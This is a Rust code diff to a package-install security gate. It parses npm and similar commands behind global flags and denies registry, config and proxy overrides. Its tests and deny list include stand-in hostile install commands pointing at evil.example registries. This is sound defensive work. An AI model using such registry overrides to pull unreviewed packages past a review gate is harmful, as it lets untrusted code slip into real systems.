@@ -327,27 +327,103 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
         if toks[i].ends_command || toks[i].is_separator {
             continue;
         }
-        let verb = toks.get(i + 1);
-        let starts_command = match (manager, verb.map(|t| t.lower.as_str())) {
-            (RefManager::Npx, _) | (RefManager::Bunx, _) => Some(i + 1),
-            // `npm exec <pkg>` / `npm x <pkg>` / `bun x <pkg>` run a package
-            // exactly like npx does.
-            (RefManager::Npm, Some("exec" | "x")) | (RefManager::Bun, Some("x")) => Some(i + 2),
-            (RefManager::Pip, Some("install" | "i")) => Some(i + 2),
-            (RefManager::Pnpm, Some("dlx")) | (RefManager::Yarn, Some("dlx")) => Some(i + 2),
-            (RefManager::Cargo, Some("install")) => Some(i + 2),
-            (
-                RefManager::Npm | RefManager::Pnpm | RefManager::Yarn | RefManager::Bun,
-                Some("install" | "i" | "add"),
-            ) => Some(i + 2),
-            // yay/paru -S: the verb is a flag; combined forms (-Syu) count.
-            (RefManager::Yay | RefManager::Paru, Some(v)) if v.starts_with("-s") => Some(i + 2),
-            _ => None,
+        // Global flags may sit between the manager and its verb
+        // (`npm --no-fund install evil`): walk them off, capturing
+        // package-naming flags, before looking for the verb.
+        let mut package_flags: Vec<String> = Vec::new();
+        let mut j = i + 1;
+        let mut skip_value = false;
+        let mut pending_package = false;
+        while j < toks.len() {
+            let t = &toks[j];
+            if t.is_separator || t.ends_command {
+                break;
+            }
+            if skip_value {
+                skip_value = false;
+                if pending_package {
+                    pending_package = false;
+                    if !has_dynamic_syntax(&t.raw) {
+                        package_flags.push(t.raw.clone());
+                    }
+                }
+                j += 1;
+                continue;
+            }
+            if !t.lower.starts_with('-') {
+                break;
+            }
+            let lower = t.lower.as_str();
+            if matches!(
+                manager,
+                RefManager::Npx | RefManager::Bunx | RefManager::Npm
+            ) {
+                if let Some(value) = PACKAGE_NAMING_FLAGS
+                    .iter()
+                    .find_map(|f| lower.strip_prefix(&format!("{f}=")))
+                {
+                    if !has_dynamic_syntax(value) {
+                        package_flags.push(value.to_string());
+                    }
+                    j += 1;
+                    continue;
+                }
+                if PACKAGE_NAMING_FLAGS.contains(&lower) {
+                    pending_package = true;
+                    skip_value = true;
+                    j += 1;
+                    continue;
+                }
+            }
+            if CONSUME_VALUE_FLAGS.contains(&lower) {
+                skip_value = true;
+            }
+            j += 1;
+        }
+        // The verb may sit behind flags whose values are not enumerable
+        // (`npm --loglevel warn install evil`): from the first non-flag
+        // token, search to the next shell separator for a known verb.
+        let mut exec_verb = false;
+        let starts_command = match manager {
+            // For npx/bunx the package IS the token after the flags — the
+            // "verb" slot — so scanning starts there, not past it.
+            RefManager::Npx | RefManager::Bunx => Some(j),
+            _ => {
+                let mut k = j;
+                let mut found = None;
+                while k < toks.len() && !toks[k].is_separator && !toks[k].ends_command {
+                    let word = toks[k].lower.as_str();
+                    let is_verb = match manager {
+                        RefManager::Npm => matches!(word, "install" | "i" | "add" | "exec" | "x"),
+                        RefManager::Bun => matches!(word, "install" | "i" | "add" | "x"),
+                        RefManager::Pnpm | RefManager::Yarn => {
+                            matches!(word, "install" | "i" | "add" | "dlx")
+                        }
+                        RefManager::Pip => matches!(word, "install" | "i"),
+                        RefManager::Cargo => matches!(word, "install"),
+                        RefManager::Yay | RefManager::Paru => word.starts_with("-s"),
+                        _ => false,
+                    };
+                    if is_verb {
+                        exec_verb = matches!(word, "exec" | "x");
+                        found = Some(k + 1);
+                        break;
+                    }
+                    k += 1;
+                }
+                found
+            }
         };
         let Some(start) = starts_command else {
             continue;
         };
-        if verb.is_some_and(|t| t.ends_command) {
+        // When a --package flag already named the package, the remaining
+        // tokens (for npx/bunx/npm exec) are the command to run, not more
+        // packages.
+        let named_by_flag = !package_flags.is_empty()
+            && (matches!(manager, RefManager::Npx | RefManager::Bunx) || exec_verb);
+        refs.extend(package_flags.into_iter().map(|s| (manager, s)));
+        if named_by_flag {
             continue;
         }
         // npx/bunx run ONE package; the remaining tokens are its args.
@@ -546,7 +622,7 @@ fn scan_text_line(line: &str, origin: &RefOrigin) -> Vec<InstallRef> {
 /// obfuscation (obase64'd scripts, indirect exec) is NOT caught here — the
 /// gate's doc says so.
 pub fn gate_hard_denies(line: &str) -> Vec<String> {
-    let mut denies = Vec::new();
+    let mut denies = npm_registry_override_shape(line);
     if let Some(detail) = pip_non_registry_shape(line) {
         denies.push(detail);
     }
@@ -564,6 +640,42 @@ pub fn gate_hard_denies(line: &str) -> Vec<String> {
             denies.push(format!(
                 "package manager token hidden behind quoting, an escape, or substitution: `{word}`"
             ));
+        }
+    }
+    denies
+}
+
+/// A gated install whose npm registry/auth config is overridden would be
+/// reviewed against npmjs while the install pulls from somewhere else —
+/// deny the override outright (mirrors the pip --index-url denial).
+fn npm_registry_override_shape(line: &str) -> Vec<String> {
+    const OVERRIDES: [&str; 6] = [
+        "--registry",
+        "--userconfig",
+        "--globalconfig",
+        "--proxy",
+        "--https-proxy",
+        "--cache",
+    ];
+    let lower = line.to_lowercase();
+    let words: Vec<&str> = lower.split_whitespace().collect();
+    let has_npm_install = words.iter().any(|w| {
+        *w == "npm" || *w == "npx" || *w == "pnpm" || *w == "yarn" || *w == "bun" || *w == "bunx"
+    }) && words
+        .iter()
+        .any(|w| matches!(*w, "install" | "i" | "add" | "exec" | "x" | "dlx"));
+    if !has_npm_install {
+        return Vec::new();
+    }
+    let mut denies = Vec::new();
+    for word in &words {
+        for flag in OVERRIDES {
+            if *word == flag || word.starts_with(&format!("{flag}=")) {
+                denies.push(format!(
+                    "npm {flag} override would review one registry and install from another"
+                ));
+                break;
+            }
         }
     }
     denies
@@ -608,6 +720,7 @@ fn pip_non_registry_shape(line: &str) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
     use crate::manifest::PackageJson;
     use std::collections::BTreeMap;
 
@@ -948,6 +1061,32 @@ mod tests {
         let refs = scan_line("bun x malcontent");
         assert_eq!(refs.len(), 1);
         assert_eq!(refs[0].1, "malcontent");
+    }
+
+    #[test]
+    fn scanner_finds_verbs_behind_leading_global_flags() {
+        for line in [
+            "npm --no-fund install evil-pkg",
+            "npm --no-audit --loglevel warn install evil-pkg",
+            "npm --registry=https://evil.example install evil-pkg",
+            "npm -p evil-pkg exec ls",
+            "npm --package=evil-pkg exec ls",
+        ] {
+            let refs = scan_line(line);
+            assert!(
+                refs.iter().any(|(_, s)| s == "evil-pkg"),
+                "{line} must surface the named package: {refs:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn gate_hard_denies_npm_registry_overrides() {
+        assert!(gate_hard_denies("npm install x --registry https://evil.example").len() == 1);
+        assert!(gate_hard_denies("npm --registry=https://evil.example install x").len() == 1);
+        assert!(gate_hard_denies("npm install x --userconfig /tmp/rc").len() == 1);
+        assert!(gate_hard_denies("npm install x").is_empty());
+        assert!(gate_hard_denies("npm ls").is_empty());
     }
 
     #[test]
